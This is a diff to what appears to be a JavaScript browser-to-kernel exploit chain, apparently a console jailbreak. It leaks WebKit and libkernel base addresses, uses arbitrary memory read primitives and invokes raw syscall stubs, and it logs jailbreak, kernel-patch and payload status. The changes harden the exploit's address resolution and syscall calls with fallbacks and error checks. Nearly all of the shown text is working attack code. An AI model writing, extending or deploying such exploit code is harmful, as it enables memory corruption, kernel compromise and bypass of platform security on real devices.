@@ -131,7 +131,7 @@ let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false
 
 let allDone = false;
 
-const CHAIN_BUILD = "chain_1352-2026-03-26e-oomfix";
+const CHAIN_BUILD = "chain_1352-2026-03-26f-step10";
 
 (async function () {
     let p = null;
@@ -375,9 +375,19 @@ const CHAIN_BUILD = "chain_1352-2026-03-26e-oomfix";
             .add32(off.wk_JSFunction_m_function));
         const webkitBase = MEASURED.webkit
             || nativeFn.sub32(off.wk_expm1_builtin);
-        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
+        let errImport = null;
+        try {
+            errImport = p.read8(webkitBase.add32(off.wk___imp___error));
+        } catch (_) { }
         const libkernelBase = MEASURED.libkernel
-            || errorFn.sub32(off.k__error);
+            || (errImport && errImport.hi > 0
+                ? errImport.sub32(off.k__error) : new int64(0, 0));
+        let errorFn = null;
+        if (libkernelBase && libkernelBase.hi > 0 && off.k__error)
+            errorFn = libkernelBase.add32(off.k__error);
+        if ((!errorFn || errorFn.hi === 0) && errImport && errImport.hi > 0)
+            errorFn = errImport;
+        mark("ERRNO-FN", errorFn ? String(errorFn) : "MISSING");
         mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase
             + (MEASURED.webkit ? " (measured)" : "")
             + (MEASURED.libkernel ? " (measured)" : ""));
@@ -454,6 +464,8 @@ const CHAIN_BUILD = "chain_1352-2026-03-26e-oomfix";
                 dv.setUint32(at, v >>> 0, true);
                 dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
             } else {
+                if (!v || typeof v.low !== "number" || typeof v.hi !== "number")
+                    throw new Error("put: bad int64 at 0x" + at.toString(16));
                 dv.setUint32(at, v.low >>> 0, true);
                 dv.setUint32(at + 4, v.hi >>> 0, true);
             }
@@ -513,8 +525,14 @@ const CHAIN_BUILD = "chain_1352-2026-03-26e-oomfix";
                      hi: M.frameDv.getUint32(4, true),
                      i32: M.frameDv.getUint32(0, true) | 0 };
         }
-        const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
+        const sc = (num, ...a) => {
+            const stub = stubAddr.get(num);
+            if (!stub)
+                throw new Error("missing syscall stub num=0x" + (num >>> 0).toString(16));
+            return callAddr(stub, a);
+        };
         function errno() {
+            if (!errorFn) return -1;
             const r = callAddr(errorFn, []);
             const a = new int64(r.lo, r.hi);
             return (a.hi === 0 && a.low === 0) ? -1 : p.read4(a) | 0;
@@ -1605,7 +1623,10 @@ const CHAIN_BUILD = "chain_1352-2026-03-26e-oomfix";
         }
         function fireW(w, num, args, timeoutMs) {
             if (!w.ctx) w.ctx = makeCtx(false);
-            layout(w.ctx, stubAddr.get(num), args);
+            const stub = stubAddr.get(num);
+            if (!stub)
+                throw new Error("fireW: missing stub num=0x" + (num >>> 0).toString(16));
+            layout(w.ctx, stub, args);
             return w.rpc("fire", timeoutMs === undefined ? 15000 : timeoutMs,
                 w.ctx.S.low, w.ctx.S.hi);
         }
@@ -3389,7 +3410,13 @@ const CHAIN_BUILD = "chain_1352-2026-03-26e-oomfix";
                     // ---- [STEP10-CHAIN] local syscall shim (scope fix: sc@501 is NOT in
 // this nested block; callAddr + stubAddr ARE -- proven by the live log --
 // so rebuild sc here from the visible pair instead of relying on the outer const):
-const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
+const sc = (num, ...a) => {
+                        const stub = stubAddr.get(num);
+                        if (!stub)
+                            throw new Error("missing syscall stub num=0x"
+                                + (num >>> 0).toString(16));
+                        return callAddr(stub, a);
+                    };
 mark("STEP10-CHAIN", "kv=up jailbroken=" + jailbroken
                         + " kpatched=" + kpatched + " payload=" + payloadRunning
                         + " cleanup=" + (rebootRequired ? "incomplete" : "complete"));
